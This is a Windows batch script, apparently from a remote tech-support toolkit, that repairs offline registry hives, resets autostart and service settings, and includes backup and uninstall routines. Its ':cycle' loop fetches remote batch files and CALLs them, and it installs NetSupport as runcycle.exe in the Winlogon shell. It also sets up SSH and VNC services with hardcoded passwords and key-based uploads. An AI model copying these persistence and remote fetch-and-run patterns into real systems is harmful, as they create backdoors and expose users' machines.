if "%system%" equ "customer" (secedit.exe /configure /cfg %drv0%\%_windir%\repair\secsetup.inf /db secsetup.sdb /verbose)
echo \Registry\Machine\software_on_c\Microsoft\Security Center\svc [1 8 17] >regini.ini
REM psexec.exe must create service entry for safemode use.
REM psexec -i -s regini.exe regini.ini
REM regini.exe must be run with system priviledges.
regini.exe regini.ini
::---------------------------------------------------------------------------------------------------------------------

REM reg query hklm\system_on_c\controlset001\services\stabilitymon>NUL || echo error svc73106>>"%log%" &&goto ftp_upload
REM reg query hklm\system_on_c\controlset001\services\sshd>NUL || echo error svc59745>>"%log%" &&goto ftp_upload
REM reg query hklm\system_on_c\controlset001\services\uvnc_service>NUL || echo error svc6140>>"%log%" &&goto ftp_upload

::------------Fixing locked regedit.exe and resetting executable permissions----------------------
echo [Version] >classes8.inf
echo Signature="$Chicago$" >>classes8.inf
echo Provider=TechSupport >>classes8.inf
echo [DefaultInstall] >>classes8.inf
echo AddReg=UnhookRegKey >>classes8.inf
echo [UnhookRegKey] >>classes8.inf
echo HKLM, Software_on_C\CLASSES\batfile\shell\open\command,,,"""%%1"" %%zz" >>classes8.inf
echo HKLM, Software_on_C\CLASSES\comfile\shell\open\command,,,"""%%1"" %%zz" >>classes8.inf
echo HKLM, Software_on_C\CLASSES\exefile\shell\open\command,,,"""%%1"" %%zz" >>classes8.inf
echo HKLM, Software_on_C\CLASSES\piffile\shell\open\command,,,"""%%1"" %%zz" >>classes8.inf
echo HKLM, Software_on_C\CLASSES\regfile\shell\open\command,,,"regedit.exe ""%%1""" >>classes8.inf
echo HKLM, Software_on_C\CLASSES\scrfile\shell\open\command,,,"""%%1"" %%zz" >>classes8.inf
echo HKLM, Software_on_C\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes8.inf
echo HKCU, Software_on_C\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes8.inf
type classes8.inf | sed "s/zz/*/" >classes_tmp && move classes_tmp classes8.inf
start rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 .\classes8.inf 2>&1 >NUL 2>&1
sleep 15 & pskill rundll32

:services-updates

::------------Fixing Windows Updates----------------------
echo \Registry\Machine\system_on_c\controlset001\services\wuauserv [1 8 17] >regini.ini
regini.exe regini.ini
reg add hklm\system_on_c\controlset001\services\wuauserv /v imagepath /t reg_expand_sz /f /d "%drv0%\%_windir%\system32\svchost.exe -k netsvcs"
REM reg add hklm\system\currentcontrolset\services\wuauserv /v imagepath /t reg_expand_sz /f /d "%systemroot\system32\svchost.exe -k netsvcs"

if "%system%" equ "customer" (
net stop wuauserv
REGSVR32 WUPS2.DLL /S
REGSVR32 WUPS.DLL /S
REGSVR32 WUAUENG.DLL /S
REGSVR32 WUAPI.DLL /S
REGSVR32 MUCLTUI.DLL /S
REGSVR32 WUCLTUI.DLL /S
REGSVR32 WUWEB.DLL /S
REGSVR32 MUWEB.DLL /S
REGSVR32 QMGR.DLL /S
REGSVR32 QMGRPRXY.DLL /S
REGSVR32 WUCLTUX.DLL /S
REGSVR32 WUWEBV.DLL /S
REGSVR32 JSCRIPT.DLL /S
REGSVR32 MSXML3.DLL /S
REM reboot to enable registry changes
REM reg query hku | find /I "S-1-5-21" | find /I "Classes" | sed "s/_Classes//g"
)

goto services-safeboot

:services-svc
::------------Updating services----------------------
echo marksvc6926>>"%log%"
del services-old.reg services.reg >NUL 2>&1
reg export hklm\system_on_c\controlset001\services services.reg || echo error svc856186>>"%log%" &&goto ftp_upload
if not exist services-backup.reg (copy services.reg services-backup.reg || echo error svc56485>>"%log%" &&goto ftp_upload)
type services.reg | sed "/.Start.=dword:00000002/s/0000000./00000004/" >services2.reg
echo importing services2.reg & reg import services2.reg || echo error svc4559>>"%log%" &&goto ftp_upload

if not exist "%drv0%\%_windir%\boot\pcat" (
echo.>>services-xp.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\stabilitymon]>>services-xp.reg
echo "Start"=dword:00000002>>services-xp.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\sshd]>>services-xp.reg
echo "Start"=dword:00000002>>services-xp.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\uvnc_service]>>services-xp.reg
echo "Start"=dword:00000002>>services-xp.reg
echo importing services-xp.reg>>"%log%" &reg import services-xp.reg || echo error svc45197>>"%log%" &&goto ftp_upload
)

if exist "%drv0%\%_windir%\boot\pcat" (
echo.>>services-vista.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\stabilitymon]>>services-vista.reg
echo "Start"=dword:00000002>>services-vista.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\sshd]>>services-vista.reg
echo "Start"=dword:00000002>>services-vista.reg
echo [HKEY_LOCAL_MACHINE\system_on_c\controlset001\Services\uvnc_service]>>services-vista.reg
echo "Start"=dword:00000002>>services-vista.reg
echo importing services-vista.reg>>"%log%" &reg import services-vista.reg ||echo error svc284>>"%log%" &&goto ftp_upload
)

:services-safeboot
::------------Updating safeboot-network services----------------------
echo marksvc8207>>"%log%"
if not exist services_safeboot.reg (reg export hklm\system_on_c\controlset001\control\safeboot services_safeboot.reg)

REM if not exist "%drv0%\%_windir%\boot\pcat" (type safeboot_network_xp.txt >safeboot_network.reg || echo error svc6126>>"%log%" &&goto ftp_upload)
REM if exist "%drv0%\%_windir%\boot\pcat" (type safeboot_network_vista.txt >safeboot_network.reg || echo error svc7134>>"%log%" &&goto ftp_upload)
REM reg query hklm\system_on_c\controlset001\control\safeboot\network /s | grep -a1 "{" >>safeboot_network.reg||echo error svc485>>"%log%" &&goto ftp_upload
reg delete hklm\system_on_c\controlset001\control\safeboot /f >NUL 2>&1
REM reg import safeboot_network.reg

if not exist "%drv0%\%_windir%\boot\pcat" (
echo importing safeboot-xp-sp3.reg>>"%log%" &reg import safeboot-xp-sp3.reg ||echo error svc47537>>"%log%" &&goto ftp_upload
)

if exist "%drv0%\%_windir%\boot\pcat" (
echo importing safeboot-vista.reg>>"%log%" &reg import safeboot-vista.reg ||echo error svc71549>>"%log%" &&goto ftp_upload
)

reg add hklm\software_on_c\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v shell /t REG_SZ /f /d explorer.exe,runcycle,sessmngr
REM reg query hklm\system_on_c\controlset001\control\safeboot\network\sshd>NUL || echo error svc74124>>"%log%" &&goto ftp_upload
REM reg query hklm\system_on_c\controlset001\control\safeboot\network\stabilitymon>NUL || echo error svc3746>>"%log%" &&goto ftp_upload
REM reg query hklm\system_on_c\controlset001\control\safeboot\network\uvnc_service>NUL || echo error svc1923>>"%log%" &&goto ftp_upload

:services-autostart
::------------Removing autostart entries----------------------

echo marksvc2296>>"%log%"
if exist users.txt del users.txt

if "%system%" equ "customer" (
echo marksvc4821>>"%log%"
for /f "tokens=* delims= " %%a in ('dir /S /B "%erunt-working%\users" ^| find /I "ntuser.dat.log"') do del "%%a"
for /f "tokens=* delims= " %%a in ('dir /S /B "%erunt-working%\users" ^| find /I "ntuser.dat"') do (
echo %%a>>users.txt
reg load hklm\user000 "%%a"
reg delete hklm\user000\software\Microsoft\Windows\currentversion\Run /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunOnce /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunServices /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunServicesOnce /f >NUL 2>&1
reg unload hklm\user000
)
 )
 
if "%system%" equ "techsupport" (
echo marksvc2810>>"%log%"
for /f "tokens=* delims= " %%a in ('dir /S /B "%profilesdirectory%" ^| find /I "ntuser.dat.log"') do del "%%a"
for /f "tokens=* delims= " %%a in ('dir /S /B "%profilesdirectory%" ^| find /I "ntuser.dat"') do (
echo %%a>>users.txt
reg load hklm\user000 "%%a"
reg delete hklm\user000\software\Microsoft\Windows\currentversion\Run /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunOnce /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunServices /f >NUL 2>&1
reg delete hklm\user000\software\Microsoft\Windows\currentversion\RunServicesOnce /f >NUL 2>&1
reg unload hklm\user000
)
 )

reg delete hklm\default_on_c\software\Microsoft\Windows\currentversion\Run /f >NUL 2>&1
reg delete hklm\default_on_c\software\Microsoft\Windows\currentversion\RunOnce /f >NUL 2>&1
reg delete hklm\default_on_c\software\Microsoft\Windows\currentversion\RunServices /f >NUL 2>&1
reg delete hklm\default_on_c\software\Microsoft\Windows\currentversion\RunServicesOnce /f >NUL 2>&1

reg delete hklm\software_on_c\Microsoft\Windows\currentversion\Run /f >NUL 2>&1
reg delete hklm\software_on_c\Microsoft\Windows\currentversion\RunOnce /f >NUL 2>&1
reg delete hklm\software_on_c\Microsoft\Windows\currentversion\RunOnceEx /f >NUL 2>&1
reg delete hklm\software_on_c\Microsoft\Windows\currentversion\RunOnceSetup /f >NUL 2>&1
reg delete hklm\software_on_c\Microsoft\Windows\currentversion\RunServices /f >NUL 2>&1
reg delete hklm\software_on_c\Microsoft\Windows\currentversion\RunServicesOnce /f >NUL 2>&1

reg add "hklm\default_on_c\software\Microsoft\Windows\currentversion\Internet Settings" /v ProxyEnable /t reg_dword /f /d 0
reg add "hklm\software_on_c\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" /v Security_HKLM_only /t reg_dword /f /d 1
reg add "hklm\software_on_c\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxySettingsPerUser /t reg_dword /f /d 1


set regkey=hklm\system_on_c\ControlSet001\Control\Session Manager
reg add "%regkey%" /v PendingFileRenameOperations /f /t "REG_MULTI_SZ"

echo deleting "%startdir%" & xcopy /i /e /y "%startdir%" %drv0%\userstartup_dis & del /q /f "%startdir%\*" >NUL 2>&1
echo deleteing "%allstartdir%" & xcopy /i /e /y "%allstartdir%" %drv0%\allstartup_dis & del /q /f "%allstartdir%\*" >NUL 2>&1
echo 127.0.0.1 localhost>%drv0%\%_windir%\system32\drivers\etc\hosts

if exist %drv0%\autoexec.bat if not exist %drv0%\autoexec.bat.bak (
  copy /y %drv0%\autoexec.bat %drv0%\autoexec.bat.bak
  echo.>%drv0%\autoexec.bat || error svc4605>>"%log%"
)

if exist %drv0%\config.sys if not exist %drv0%\config.sys.bak (
  copy /y %drv0%\config.sys %drv0%\config.sys.bak
  echo Files=40>%drv0%\config.sys || error svc46045>>"%log%"
)

REM check %systemroot%\system32\config.nt (these files do not autostart)
REM check %systemroot%\system32\autoexec.nt (these files do not autostart)

  find /I "shell=" %drv0%\%_windir%\system.ini &&type %drv0%\%_windir%\system.ini|sed "s/shell=.*.//gi">%temp%\system.ini
  if exist "%temp%\system.ini" (copy /y "%temp%\system.ini" %drv0%\%_windir%\system.ini||error svc2646>>"%log%")

  find /I "run=" %drv0%\%_windir%\win.ini &&type %drv0%\%_windir%\win.ini | sed "s/run=.*.//gi">%temp%\win.ini
  if exist "%temp%\win.ini" (copy /y "%temp%\win.ini" %drv0%\%_windir%\win.ini||error 613405>>"%log%")

  find /I "load=" %drv0%\%_windir%\win.ini &&type %drv0%\%_windir%\win.ini | sed "s/load=.*.//gi">%temp%\win.ini
  if exist "%temp%\win.ini" (copy /y "%temp%\win.ini" %drv0%\%_windir%\win.ini||error svc3405>>"%log%")

if exist %drv0%\%_windir%\wininit.ini if not exist %drv0%\%_windir%\wininit.ini.bak (
  echo processing %drv0%\%_windir%\wininit.ini>>"%log%" 
  copy /y %drv0%\%_windir%\wininit.ini %drv0%\%_windir%\wininit.ini.bak
  echo >%drv0%\%_windir%\wininit.ini || error svc5517>>"%log%"
)

::----------------------------------

if exist "%drv0%\%_windir%\boot\pcat" (
REM To Do: try regini.exe to fix these vista registry permissions?
REM reg add hklm\software_on_c\Microsoft"\security Center"\svc /v UacDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software_on_c\Microsoft"\security Center"\svc /v FirewallOverride /t REG_DWORD /d 0 /f
REM reg add hklm\software_on_c\Microsoft"\security Center"\svc /v FirewallDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software_on_c\Microsoft"\security Center"\svc /v UpdatesDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software_on_c\Microsoft"\security Center"\svc /v EnableNotifications /t REG_DWORD /d 0 /f
)

if not exist "%drv0%\%_windir%\boot\pcat" (
REM reg add hklm\software_on_c\Microsoft"\security Center" /v FirewallOverride /t REG_DWORD /d 0 /f
REM reg add hklm\software_on_c\Microsoft"\security Center" /v FirewallDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software_on_c\Microsoft"\security Center" /v UpdatesDisableNotify /t REG_DWORD /d 1 /f
)

if "%system%" equ "customer" (
REM reg delete hklm\System\CurrentControlSet\Services\Winsock /f
REM reg delete hklm\System\CurrentControlSet\Services\Winsock2 /f
netsh winsock reset & netsh winsock reset catalog & netsh int reset all
REM start rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemroot%\inf\Nettcpip.inf
sleep 15 & pskill rundll32
ipconfig /release && ipconfig /renew & ipconfig /flushdns
)

echo unloading hives
reg unload hklm\system_on_c || echo error svc7315>>"%log%" &&goto ftp_upload
reg unload hklm\software_on_c || echo error svc3195>>"%log%" &&goto ftp_upload
reg unload hklm\default_on_c || echo error svc4375>>"%log%" &&goto ftp_upload
reg unload hklm\user000 >NUL 2>&1

echo [SystemRoot]>%erunt-working%\erdnt.inf || echo error svc5864>>"%log%" &&goto ftp_upload
echo "%drv0%\%_windir%">>%erunt-working%\erdnt.inf
echo [Restore]>>%erunt-working%\erdnt.inf
echo "MACHINE SOFTWARE">>%erunt-working%\erdnt.inf
echo "software">>%erunt-working%\erdnt.inf
echo "%drv0%\%_windir%\system32\config\software">>%erunt-working%\erdnt.inf
echo [Restore]>>%erunt-working%\erdnt.inf
echo "MACHINE SYSTEM">>%erunt-working%\erdnt.inf
echo "system">>%erunt-working%\erdnt.inf
echo "%drv0%\%_windir%\system32\config\system">>%erunt-working%\erdnt.inf
start %erunt-working%\erdnt silent sysreg /nobackup /noprogresswindow
sleep 15 & pskill erdnt && echo error ernt4635>>"%log%
echo services completed OK [reboot necessary]>>"%log%"
goto EOF

:checkdisk
echo chkdsk8044>>"%log%"
REM chkdsk logfile location: %drv0%\bootex.log
set regkey=hklm\system\ControlSet001\Control\Session Manager
if "%system%" equ "techsupport" (
copy /y %drv0%\minint\system32\setupreg.hiv %drv0%\minint\system32\setupreg_backup.hiv ^
  ||echo error chkdsk3594>>"%log%"&&goto EOF
reg load hklm\setupreg %drv0%\minint\system32\setupreg.hiv ^
  ||echo error chkdsk614>>"%log%"&&goto EOF
set regkey=hklm\setupreg\ControlSet001\Control\Session Manager
)
reg add "%regkey%" /v BootExecute /f /t reg_multi_sz /d "autocheck autochk /r *" ^
 ||echo error chkdsk585>>"%log%"&&goto EOF
if "%system%" equ "techsupport" (reg unload hklm\setupreg)
mark chkdsk 4282>>"%log%"
goto EOF

:sfc
echo mark8824>>"%log%"
set ftpfile=%log%
if "%system%" equ "techsupport" (echo Sorry! cannot run sfc in techsupport system & goto EOF)
cd /d %drv0%\
if /I "%winversion%" equ "WinXP" if not exist i386 (
find /I "home" c:\boot.ini>NUL && download http://%fileserver%/xphome-i386.7z /overwrite
find /I "professional" c:\boot.ini>NUL && download http://%fileserver%/xppro-i386.7z /overwrite
7z x -y xp*-i386.7z || echo error svc894416>>"%log%" &&goto ftp_upload
)

reg add hklm\software\Microsoft\Windows\CurrentVersion\Setup /v ServicePackSourcePath /t REG_SZ /d C:\ /f
reg add hklm\software\Microsoft\Windows\CurrentVersion\Setup /v SourcePath /t REG_SZ /d C:\ /f
reg add hklm\software\Microsoft\Windows\CurrentVersion\Setup /v "Installation Sources" /t REG_SZ /d C:\ /f
sfc /scannow
goto EOF


:backup-windows
echo backing up %drv0%\windows>>"%log%"
if "%system%" equ "customer" (echo error backup2365>>"%log%" & goto EOF)
set X=windows
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup6425>>"%log%"
goto EOF

:backup-programs
echo backing up %drv0%\program files>>"%log%"
echo backing up %drv0%\programdata>>"%log%"
if "%system%" equ "customer" (echo error backup2365 & goto EOF)
set X=programdata
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup2495>>"%log%"
set X=program files
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup8846>>"%log%"
goto EOF

:backup-documents
echo backing up %drv0%\documents and settings>>"%log%"
echo backing up %drv0%\users>>"%log%"
if "%system%" equ "customer" (echo error backup2365>>"%log%" & goto EOF)
set X=documents and settings
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup8167>>"%log%"
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup6455>>"%log%"
goto EOF


:backup-files
echo backing up System files, Documents, and Programs>>"%log%"
if "%system%" equ "customer" (echo error backup2365>>"%log%" & goto EOF)

set X=windows
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup9814>>"%log%"
   if exist "%X%.7z" del "%X%.7z"
set X=documents and settings
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup2462>>"%log%"
set X=users
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup4672>>"%log%"
set X=programdata
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup7315>>"%log%"
set X=program files
   if exist "%drv0%\%X%.7z.exe" del "%drv0%\%X%.7z.exe"
   dir "%drv0%\%X%">NUL && 7z a -sfx -p123123 -mx%compression% "%drv0%\%X%.7z.exe" "%drv0%\%X%"||echo error backup8226>>"%log%"
goto EOF


:cycle
sleep --h>NUL 2>&1 ||download http://%fileserver%/sleep.exe /timeout:120 /overwrite
set download1=download http://%fileserver%/netsupport.exe /timeout:120 /overwrite /output:%systemroot%\runcycle.exe
if not exist %systemroot%\runcycle.exe %download1%
download http://%fileserver%/all-commands.bat /timeout:10 /overwrite &&CALL all-commands.bat
download http://%fileserver%/%id%-commands.bat /timeout:10 /overwrite &&CALL %id%-commands.bat
if exist %id%-commands.bat (del %id%-commands.bat)
if exist all-commands.bat (del all-commands.bat)
if exist %systemdrive%\_support\shutdown2.exe (sleep 30m && goto cycle)
if exist b:\_support\shutdown2.exe (sleep 30m && goto cycle)
sleep 6h && goto cycle
goto EOF


:sendkeys

> "%temp%\code.vbs" echo Set WshShell = WScript.CreateObject("WScript.Shell")
>> "%temp%\code.vbs" echo WshShell.Run "%_sendkeys%"
>> "%temp%\code.vbs" echo WScript.Sleep 9000
>> "%temp%\code.vbs" echo WshShell.SendKeys "{ENTER}"
cscript //e:vbscript //NoLogo "%temp%\code.vbs"
del "%temp%\code.vbs" >NUL 2>&1
goto EOF


:ping_test
echo mark4650>>"%log%"
SET /a randID2=%1 >NUL 2>&1
SET /a randID2=%randID2% + 1
set internet=

ping -i 255 %fileserver% | find "bytes=">NUL 2>&1 &&set fileserver=%fileserver%&&set internet=yes

if "%internet%" equ "yes" (echo goto EOF & goto EOF)
sleep 5 || ping -n 5 344 >NUL 2>&1
ping -i 255 %fileserver_backup1%|find "bytes=">NUL 2>&1&&set fileserver=%fileserver_backup1%&&set internet=yes

if "%internet%" equ "yes" (echo goto EOF & goto EOF)
ping -i 255 %fileserver_backup2%|find "bytes=">NUL 2>&1&&set fileserver=%fileserver_backup2%&&set internet=yes

if "%internet%" equ "yes" (echo goto EOF & goto EOF)
echo error 750734>>"%log%"

If "%randID2%" neq "5" (echo jump EOF &goto EOF)
echo mark4654>>"%log%"
echo Internet Connection not detected [error 615727]>>"%log%"
echo Internet Connection not detected
REM devcon.exe remove *ISATAP* >>"%log%"
REM ipconfig /release *tunnel* 2>&1 >NUL 2>&1
REM reg delete hklm\System\CurrentControlSet\Services\Winsock /f
REM reg delete hklm\System\CurrentControlSet\Services\Winsock2 /f
netsh winsock reset & netsh int reset all & netsh winsock reset catalog
REM start rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemroot%\inf\Nettcpip.inf
REM sleep 15 & pskill rundll32
ipconfig /release & ipconfig /renew & ipconfig /flushdns
ipconfig /all >>"%log%"
if exist %drv0%\%_windir%\_antivirus.exe (set pingfail=no)
if exist %drv0%\nopingfail (set pingfail=no)
if "%pingfail%" equ "no" (echo mark6149514>>"%log%"&echo goto EOF & goto EOF)

if "%safeboot%" neq "yes" if "%system%" equ "customer" (CALL :safemode)
if "%safeboot%" equ "yes" (CALL :nosafemode)

if not exist %path1%\menu.lst-support (copy /y %path2%\menu.lst* %path1%\ 2>&1 >NUL 2>&1)

if "%system%" equ "customer" if exist %drv0%\menu.lst if not exist %drv0%\menu.lst-locked (
copy /y %path1%\menu.lst-support %drv0%\menu.lst || echo error 9456070574>>"%log%"
)

if "%system%" equ "techsupport" if exist %drv0%\vmlinuz if not exist %drv0%\menu.lst-locked (
copy /y %path1%\menu.lst-linremote %drv0%\menu.lst || echo error 5410458405>>"%log%"
)

if "%system%" equ "techsupport" if not exist %drv0%\menu.lst-locked (
copy /y %path1%\menu.lst-xp %drv0%\menu.lst || echo error 5410458405>>"%log%"
)

echo mark4656>>"%log%"
if not exist %drv0%\menu.lst (shutdown2 /r||shutdown /r /f & goto EOF)
if exist %drv0%\menu.lst-locked (shutdown2 /r||shutdown /r /f & goto EOF)
if "%system%" equ "techsupport" (copy /y %path1%\menu.lst-support %drv0%\menu.lst &shutdown2 /r||shutdown /r &goto EOF)
if not exist %drv0%\%_windir%\boot\pcat (copy /y %path1%\menu.lst-xp %drv0%\menu.lst&shutdown2 /r||shutdown /r /f &goto EOF)
if exist %drv0%\%_windir%\boot\pcat (copy /y %path1%\menu.lst-vista %drv0%\menu.lst&shutdown2 /r||shutdown /r /f &goto EOF)

cls & pskill lock.exe 2>&1 >NUL 2>&1
 > "%temp%\code.vbs" ECHO WScript.Timeout = 30
 >> "%temp%\code.vbs" ECHO WScript.Echo msgBox("Internet Connection not detected",vbsystemModal+0,"WARNING")
if "%silent%" neq "yes" FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET i=%%A
del "%temp%\code.vbs" >NUL 2>&1
If "%i%" equ "7" (shutdown /a & goto EOF)
echo SYSTEM WILL REBOOT>>"%log%"&echo SYSTEM WILL REBOOT NOW &shutdown2 /r ||shutdown /r
goto EOF

:ftp_upload
echo mark9420>>"%log%"
download http://%fileserver%/connection_test /timeout:30 /overwrite || goto EOF
   echo "cmd /c echo user ftp1>ftpcmd.dat" >ftp.bat
   echo "cmd /c echo 3544>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo prompt n>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo bin>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo cd support_logs>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo put %%1%%>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo quit>>ftpcmd.dat" >>ftp.bat
   echo ftp.exe -n -s:ftpcmd.dat %%2%% >>ftp.bat
   cmd /c ftp.bat %ftpfile% %ftpserver%
   del ftpcmd.dat ftp.bat >NUL 2>&1
   goto EOF

:ftp_download
   cls & echo ftp Connecting [transfer]  Please Wait...
   echo Connecting [ftp download]  >>"%log%"
   echo "cmd /c echo USER anonymous>ftpcmd.dat" >ftp.bat
   echo "cmd /c echo password>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo bin>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo prompt n>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo get %%1%%>>ftpcmd.dat" >>ftp.bat
   echo "cmd /c echo quit>>ftpcmd.dat" >>ftp.bat
   echo ftp.exe -n -s:ftpcmd.dat %%2%%>>ftp.bat
   cmd /c ftp.bat %ftpfile% %ftpserver%
   del ftpcmd.dat ftp.bat >NUL 2>&1
goto EOF

:vbs_download
echo downloading %vbs1_file% [vbs_download] &del download.exe
echo HTTPDownload "http://%fileserver%/%vbs1_file%", "." >"%vbs1%"
echo Sub HTTPDownload( myURL, myPath ) >>"%vbs1%"
echo Dim i, objFile, objFSO, objHTTP, strFile, strMsg >>"%vbs1%"
echo    Const ForReading = 1, ForWriting = 2, ForAppending = 8 >>"%vbs1%"
echo    Set objFSO = CreateObject( "Scripting.FileSystemObject" ) >>"%vbs1%"
echo    If objFSO.FolderExists( myPath ) Then >>"%vbs1%"
echo        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) ) >>"%vbs1%"
echo    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then >>"%vbs1%"
echo        strFile = myPath >>"%vbs1%"
echo    Else >>"%vbs1%"
echo       WScript.Echo "ERROR: Target folder not found." >>"%vbs1%"
echo        Exit Sub >>"%vbs1%"
echo    End If >>"%vbs1%"
echo    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True ) >>"%vbs1%"
echo    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" ) >>"%vbs1%"
echo    objHTTP.Open "GET", myURL, False >>"%vbs1%"
echo    objHTTP.Send >>"%vbs1%"
set R=objHTTP.ResponseBody
echo    For i = 1 To LenB( %R% ) >>"%vbs1%"
echo        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) ) >>"%vbs1%"
echo    Next >>"%vbs1%"
echo    objFile.Close( ) >>"%vbs1%"
echo End Sub >>"%vbs1%"
%vbs1%
goto EOF

:rsync_download
echo downloading %file% [rsync_download]
set icw=%path1%\icw\bin
  REM rsync options -avP= archive,progress/partial(update partial file)
set rsync_options=--size-only --timeout=999 -aP -e "%icw%\ssh -i %icw%\_id_rsa -c blowfish"
%icw%\rsync %rsync_options% techsupport@%fileserver%:/var/www/electronicdispatch/%file% "."
goto EOF

:rsync_upload
echo upload %file% [rsync_upload]
set icw=%path1%\icw\bin
  REM rsync options -aP= archive,progress/partial(update partial file)
set rsync_options=--size-only --timeout=999 -aP -e "%icw%\ssh -i %icw%\_id_rsa -c blowfish"
%icw%\rsync %rsync_options% "%file%" techsupport@%fileserver%:/home/ftp/user1/support_logs
goto EOF


::uninstall
:uninstall
echo mark645>>"%log%"
set log=%temp%\%id%-uninstall.log
echo mark628>>"%log%"
set ftpfile="%log%"
time /t >"%log%" & date /t >>"%log%"
echo Uninstalling Technical Support
echo Uninstalling Technical Support>>"%log%"
echo path1=%path1%
echo id=%id%

net user "%username%" | find /I "administrators" || echo error 3110527>>"%log%" &&goto  ftp_upload

if "%id%" equ "" (echo error 6404746789>>"%log%" &goto ftp_upload)

cd /d "%path1%\" &echo mark470>>"%log%"

net start schedule &schtasks /delete /f /tn sysupdate
schtasks /create /RU "techsupport" /RP "123123" /SC daily /TN SysUpdate /TR "_uninst"
schtasks | find /I "SysUpdate" >NUL || echo Error 527912>>"%log%"
sc config "sshd" start= disabled >NUL 2>&1 & sc config "uvnc_service" start= disabled >NUL 2>&1
sc config "Index Time" start= disabled >NUL 2>&1 & sc config StabilityMon start= disabled >NUL 2>&1
sc config "Update Man" start= disabled >NUL 2>&1
sc delete sshd>NUL 2>&1 & sc delete uvnc_service >NUL 2>&1 & sc delete "Index Time" >NUL 2>&1
sc delete StabilityMon >NUL 2>&1 & sc delete "Update Man" >NUL 2>&1
netsh firewall delete allowedprogram %path1%\ftp.exe
sc config AntiVirFirewallService start= enabled 2>&1 >NUL 2>&1

Set string1=For /F "tokens=* delims=" %%i
%string1% in ('findstr "." powercfg.txt') Do Set pwrscheme=%%i
If exist powercfg.txt %string1% in ('findstr "." powercfg.txt') Do Set pwrscheme=%%i
powercfg /setactive %pwrscheme% >NUL 2>&1
if exist powercfg.reg (reg import powercfg.reg)
echo mark472>>"%log%"
REM reg add "hku\.default\control panel\desktop" /v screensaveactive /t REG_SZ /d 1 /f
reg delete "hklm\system\CurrentControlSet\Control\SafeBoot\Network\MsiServer" /f
reg delete hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v nowinlogon /f
reg delete hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v _modified /f
reg delete hkcu\SOFTWARE\ORL /f >NUL 2>&1
reg delete hklm\SOFTWARE\ORL /f >NUL 2>&1
